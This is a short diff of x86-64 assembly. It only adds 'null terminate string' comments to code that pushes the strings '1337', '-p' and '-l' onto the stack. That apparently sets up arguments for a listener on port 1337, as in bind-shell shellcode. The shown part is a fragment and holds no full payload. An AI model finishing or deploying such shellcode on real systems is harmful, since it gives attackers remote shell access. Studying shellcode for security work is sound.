@@ -33,18 +33,18 @@ _start:
 	push rsp
         pop rbx
 
-	push dx
+	push dx                ; null terminate string
 	push dword 0x37333331 ; "1337"
 	push rsp
         pop r13
 
-	push dx
+	push dx                ; null terminate string
 	push word 0x702d                ; "-p"
 	push rsp
         pop r12
 
 
-	push dx
+	push dx                ; null terminate string
 	push word 0x6c2d              ;  "-l"
 	push rsp
         pop r11
